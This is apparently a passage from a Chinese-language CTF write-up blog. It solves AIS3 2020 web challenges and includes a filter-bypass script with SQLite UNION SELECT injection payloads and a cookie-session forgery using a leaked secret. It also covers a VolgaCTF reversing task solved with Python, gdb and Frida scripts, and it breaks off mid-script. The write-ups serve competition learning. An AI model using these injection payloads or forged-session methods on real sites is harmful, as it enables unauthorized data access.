&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">name</span>&quot; <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">info</span>&quot;&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot;&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">name</span>&quot; <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">info</span>&quot;&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">id</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot;&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">info</span> <span class="title">btn</span>-<span class="title">md</span>&quot; <span class="title">value</span>=&quot;<span class="title">Login</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">white</span> <span class="title">pt</span>-5&quot;&gt;&lt;<span class="title">a</span> <span class="title">style</span>=&quot;<span class="title">color</span>: <span class="title">white</span>&quot; <span class="title">href</span>=&quot;/?<span class="title">source</span>&quot;&gt;<span class="title">SHOW</span> <span class="title">HINT</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span> <span class="title">justify</span>-<span class="title">content</span>-<span class="title">center</span> <span class="title">align</span>-<span class="title">items</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">info</span>&quot;&gt;<span class="title">Nothing</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                        <span class="title">Hello</span>, &lt;<span class="title">b</span>&gt;&lt;?= <span class="title">htmlentities</span>($<span class="title">user</span>) ?&gt;&lt;/<span class="title">b</span>&gt;, <span class="title">nothing</span> <span class="title">here</span>.</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">action</span>=<span class="title">logout</span>&quot;&gt;<span class="title">Logout</span>!&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">endif</span> ?&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>就是 sqlite 的 SQL Injection，輸入的 username 會用 <code>str_ireplace</code> 過濾兩次，很好繞過，打 <code>///***</code> 就會被過濾成 <code>/*</code>，打 <code>selselselectectect</code> 就會被過濾成 <code>select</code>，所以寫個簡單的 script 自動轉換 payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">table = &#123;</span><br><span class="line">    <span class="string">&#x27; &#x27;</span>: <span class="string">&#x27;/**/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/*&#x27;</span>: <span class="string">&#x27;///***&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*/&#x27;</span>: <span class="string">&#x27;***///&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;union&#x27;</span>: <span class="string">&#x27;unununionionion&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;select&#x27;</span>: <span class="string">&#x27;selselselectectect&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;and&#x27;</span>: <span class="string">&#x27;anananddd&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;or&#x27;</span>: <span class="string">&#x27;ooorrr&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;where&#x27;</span>: <span class="string">&#x27;whewhewhererere&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;frfrfromomom&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inp = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> t,v <span class="keyword">in</span> table.items():</span><br><span class="line">    inp = inp.replace(t, v)</span><br><span class="line"><span class="built_in">print</span>(inp)</span><br></pre></td></tr></table></figure>
<p>注意到 <code>--</code> 還是沒辦法用，因為 <code>-selselectect-</code> 會被轉成空的，<code>select</code> 順序在 <code>--</code> 前面會先被過濾掉，<code>str_ireplace</code> 是照著 list 一個個 replace 的，不過我們用 <code>/*</code> 就足夠了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;///******///unununionionion///******///selselselectectect///******///null,sql,null///******///frfrfromomom///******///sqlite_master///******///whewhewhererere///******///type=&#x27;table&#x27;///******///limit///******///1///******///offset///******///0///***</span><br></pre></td></tr></table></figure>
<p>先挖 table，找到 <code>CREATE TABLE garbage ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, value TEXT )</code>，只有這個 <code>garbage</code> 和 <code>users</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;///******///unununionionion///******///selselselectectect///******///null,name,null///******///frfrfromomom///******///garbage///******///limit///******///1///******///offset///******///0///***</span><br></pre></td></tr></table></figure>
<p>再挖 db 裡面，挖到有個 name 是 <code>something good</code>，挖他的 value 就看到 flag 了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;4_ch1ld_15_4_curly_d1mpl3d_lun471c&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Rhino">Rhino</h3>
<p>這題網站在 <a target="_blank" rel="noopener" href="https://rhino.ais3.org/%EF%BC%8C">https://rhino.ais3.org/，</a><code>robots.txt</code> 可以看到東西</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># RIP robots!</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /index.html</span><br><span class="line">Disallow: /*.xml</span><br><span class="line">Disallow: /recent</span><br><span class="line">Disallow: /assets</span><br><span class="line">Disallow: /about</span><br><span class="line">Disallow: /*.js</span><br><span class="line">Disallow: /*.json</span><br><span class="line">Disallow: /node_modules</span><br><span class="line">Disallow: /flag.txt</span><br></pre></td></tr></table></figure>
<p>然後這個網站看起來是用 express 架的然後放 jekyll 產的 blog，既然是 js project 先看個 <code>package.json</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;app&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;&quot;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start&quot;: &quot;node chill.js&quot;,</span><br><span class="line">    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;author&quot;: &quot;djosix&quot;,</span><br><span class="line">  &quot;license&quot;: &quot;ISC&quot;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;cookie-session&quot;: &quot;^1.4.0&quot;,</span><br><span class="line">    &quot;express&quot;: &quot;^4.17.1&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然後就看到原始碼叫做 <code>chill.js</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  <span class="attr">secret</span>: <span class="string">&quot;I&#x27;m watching you.&quot;</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, express.<span class="title function_">static</span>(<span class="string">&#x27;./&#x27;</span>));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag.txt&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> n = req.<span class="property">session</span>.<span class="property">magic</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &amp;&amp; (n + <span class="number">420</span>) === <span class="number">420</span>)</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;you are a sad person too&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;*&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>)&#123;</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">sendFile</span>(<span class="string">&#x27;404.html&#x27;</span>, &#123; <span class="attr">root</span>: __dirname &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(process.<span class="property">env</span>.<span class="property">PORT</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>看起來只要讓他的 <code>n &amp;&amp; (n + 420) === 420</code> 就可以讀 flag 了，以前就很常看到 FB 上有人 po 一些 js 的梗圖說明 js 很古怪的行為，隨便看了幾張複習一下，就想到有浮點數誤差的問題，所以 <code>n</code> 設成 <code>0.00000000000001</code> 就可以了，<code>n</code> 是從 <code>req.session.magic</code> 抓的，所以我們要設 <code>req.session.magic</code> 的話，最簡單的方式就是自己把 server 架起來，然後多加一行 <code>req.session.magic = 0.00000000000001</code>，就可以產出 <code>express:sess</code> 和 <code>express:sess.sig</code> 兩個 Cookie 了，sig 是用前面設定的 <code>secret: &quot;I'm watching you.&quot;</code> 算出來的，詳情可以看 <a target="_blank" rel="noopener" href="https://www.npmjs.com/package/cookie-session">cookie-session</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;h4v3_y0u_r34d_7h3_rh1n0_b00k?&#125;</span><br></pre></td></tr></table></figure>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/06/09/ais3-2020-preexam/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-05-03T16:00:00.000Z" title="5/4/2020, 12:00:00 AM">2020-05-04</time></span><i class="material-icons">schedule</i><span class="level-item">7 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/writeups/">writeups</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/05/04/f-hash/">【CTF Writeups】VolgaCTF Quals 2020 - F-Hash</a></h1><div class="content"><p>這題給了一個 x86-64 ELF Executable，直接跑下去跑不出來，一直卡在那裡，逆向一下會發現 <code>13B0</code> 這個函式是一個遞迴函式，他的虛擬碼大概長下面這樣，會一直遞迴呼叫前兩層的答案，很明顯的有很多重複的子問題，這時候就是要用 Dynamic Programming 的思路來把算過的答案記下來就不會跑那麼久了，所以這題就是要優化這個函式，把程式跑完就會印出 flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_13B0</span>(<span class="params">depth, a, b</span>):</span><br><span class="line">    ...</span><br><span class="line">    r1 = _13B0(depth - <span class="number">1</span>, a, b)</span><br><span class="line">    r2 = _13B0(depth - <span class="number">2</span>, a, b)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>以下提供三種解法，讀者可以跟著練習一下。</p>
<h2 id="Rewrite-Function-with-Python">Rewrite Function with Python</h2>
<p>最直覺的方法就是把 IDA decompile 出來的 code 搬到 python 上重寫一下，沒什麼技術，這是我在賽中用的方法，但就是要注意一下型態的問題，比如兩個 unsigned int 相乘可能 overflow 在 python 裡面要 <code>mod (1 &lt;&lt; 32)</code>，更多細節請看下面的程式碼。</p>
<figure class="highlight python"><figcaption><span>solve-rewrite.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">table = [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    table += [i * <span class="number">10</span> + <span class="number">1</span> + (<span class="number">0xf6</span> &lt;&lt; <span class="number">120</span>)] * <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bitcountsum</span>(<span class="params">a, b</span>):</span><br><span class="line">    a %= (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)</span><br><span class="line">    b %= (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bin</span>(a).count(<span class="string">&#x27;1&#x27;</span>) + <span class="built_in">bin</span>(b).count(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">a, b, depth = <span class="number">256</span></span>):</span><br><span class="line">    ans = [<span class="number">0</span>]</span><br><span class="line">    ans.append((bitcountsum(a, b), <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    ans.append((bitcountsum(a ^ <span class="number">1</span>, b), <span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, depth + <span class="number">1</span>):</span><br><span class="line">        v15, v16 = ans[i - <span class="number">1</span>], ans[i - <span class="number">2</span>]</span><br><span class="line">        v13 = ((v15[<span class="number">0</span>] + v15[<span class="number">1</span>] * (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)) + (v16[<span class="number">0</span>] + v16[<span class="number">1</span>] * (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)) + bitcountsum((v15[<span class="number">2</span>] + v16[<span class="number">2</span>]) ^ a, b)) % (<span class="number">1</span> &lt;&lt; <span class="number">128</span>)</span><br><span class="line">        v14 = table[i]</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> (v14 &gt;&gt; <span class="number">64</span>) &gt; (v13 &gt;&gt; <span class="number">64</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> (v14 &gt;&gt; <span class="number">64</span>) == (v13 &gt;&gt; <span class="number">64</span>):</span><br><span class="line">                <span class="keyword">if</span> v14 % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) &gt;= v13 % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            k = <span class="built_in">max</span>(<span class="number">1</span>, (v13 &gt;&gt; <span class="number">64</span>) // (v14 &gt;&gt; <span class="number">64</span>))</span><br><span class="line">            v13 = (v13 - k * v14) % (<span class="number">1</span> &lt;&lt; <span class="number">128</span>)</span><br><span class="line">        ans.append((v13 % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>), (v13 &gt;&gt; <span class="number">64</span>), (v15[<span class="number">2</span>] + v16[<span class="number">2</span>]) % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)))</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">al = [<span class="number">0x6369757120656854</span>, <span class="number">0x706d756a20786f66</span>, <span class="number">0x20797a616c206568</span>, <span class="number">0</span>]</span><br><span class="line">bl = [<span class="number">0x206e776f7262206b</span>, <span class="number">0x74207265766f2073</span>, <span class="number">0x80676f64</span>, <span class="number">0x2b</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(al, bl):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">hex</span>, calc(a, b)[<span class="number">256</span>])))</span><br></pre></td></tr></table></figure>
<h2 id="GDB">GDB</h2>
<p>另一個方法是我在賽後看 <a target="_blank" rel="noopener" href="https://pastebin.com/Dj6wteXk">別人</a> 用的，在 gdb 寫 python 去 hook <code>13B0</code> 的開頭和結尾，在開頭判斷這組參數有沒有出現過了，跑過就把參數的 <code>depth</code> 設成 1 也就是 base case 讓他不要再往下遞迴了，而因為同一組函式的 <code>Start, End</code> Hook 沒辦法共享資訊，所以需要維護一個 <code>state</code> 來放目前的參數，在結尾的時候一樣是看這組參數有沒有出現過，有就把答案寫上去，沒有就把答案存起來下次就不會再跑一次了。</p>
<figure class="highlight python"><figcaption><span>solve-gdb.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(gdb.parse_and_eval(name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">address, size</span>):</span><br><span class="line">    inf = gdb.inferiors()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> inf.read_memory(address, size).tobytes()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">address, buf</span>):</span><br><span class="line">    inf = gdb.inferiors()[<span class="number">0</span>]</span><br><span class="line">    inf.write_memory(address, buf)</span><br><span class="line"></span><br><span class="line">memory = &#123;&#125;</span><br><span class="line">state = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Start</span>(gdb.Breakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, location</span>):</span><br><span class="line">        <span class="built_in">super</span>(Start, self).__init__(spec = location, <span class="built_in">type</span> = gdb.BP_BREAKPOINT, internal = <span class="literal">False</span>, temporary = <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        state.append((register(<span class="string">&#x27;$rdi&#x27;</span>), register(<span class="string">&#x27;$rsi&#x27;</span>), register(<span class="string">&#x27;$rdx&#x27;</span>), register(<span class="string">&#x27;$rcx&#x27;</span>)))</span><br><span class="line">        <span class="keyword">if</span> memory.get(state[-<span class="number">1</span>][<span class="number">1</span>:]) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            gdb.execute(<span class="string">&#x27;set $rsi = 1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">End</span>(gdb.Breakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, location</span>):</span><br><span class="line">        <span class="built_in">super</span>(End, self).__init__(spec = location, <span class="built_in">type</span> = gdb.BP_BREAKPOINT, internal = <span class="literal">False</span>, temporary = <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> state</span><br><span class="line">        buf, h = state[-<span class="number">1</span>][<span class="number">0</span>], state[-<span class="number">1</span>][<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> memory.get(h) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            memory[h] = (read(buf, <span class="number">8</span>), read(buf + <span class="number">8</span>, <span class="number">8</span>), read(buf + <span class="number">16</span>, <span class="number">8</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            write(buf, memory[h][<span class="number">0</span>])</span><br><span class="line">            write(buf + <span class="number">8</span>, memory[h][<span class="number">1</span>])</span><br><span class="line">            write(buf + <span class="number">16</span>, memory[h][<span class="number">2</span>])</span><br><span class="line">        state = state[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">Start(<span class="string">f&#x27;*<span class="subst">&#123;<span class="number">0x0000555555554000</span> + <span class="number">0x13b0</span>&#125;</span>&#x27;</span>)</span><br><span class="line">End(<span class="string">f&#x27;*<span class="subst">&#123;<span class="number">0x0000555555554000</span> + <span class="number">0x1424</span>&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><code>gdb f-hash</code> 之後，在 gdb 裡面執行 <code>source solve-gdb.py</code> 就可以跑上面的程式碼了<br>
或是也可以在執行 gdb 的時候就載入 <code>gdb -x solve-gdb.py f-hash</code></p>
<h2 id="Frida">Frida</h2>
<p>這個方法也是我賽後看 <a target="_blank" rel="noopener" href="https://sectt.github.io/writeups/Volga20/f-hash/README">別人</a> 用的，frida 真的是好東西，之前剛好有研究一點 frida，第一次用在比賽中，基本上跟前一個解法一樣去 hook 函式的開頭和結尾，不過 frida 又更方便了，請看下面程式碼。</p>
<figure class="highlight javascript"><figcaption><span>solve-frida.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> base = <span class="title function_">ptr</span>(<span class="title class_">Process</span>.<span class="title function_">enumerateModulesSync</span>()[<span class="number">0</span>].<span class="property">base</span>)</span><br><span class="line"><span class="keyword">var</span> recursive_func_ptr = base.<span class="title function_">add</span>(<span class="number">0x13b0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mem = &#123;&#125;</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(recursive_func_ptr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">buf</span> = args[<span class="number">0</span>]</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">hash</span> = args[<span class="number">1</span>] + <span class="string">&#x27;-&#x27;</span> + args[<span class="number">2</span>] + <span class="string">&#x27;-&#x27;</span> + args[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> (mem[<span class="variable language_">this</span>.<span class="property">hash</span>] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">            args[<span class="number">1</span>] = <span class="title function_">ptr</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    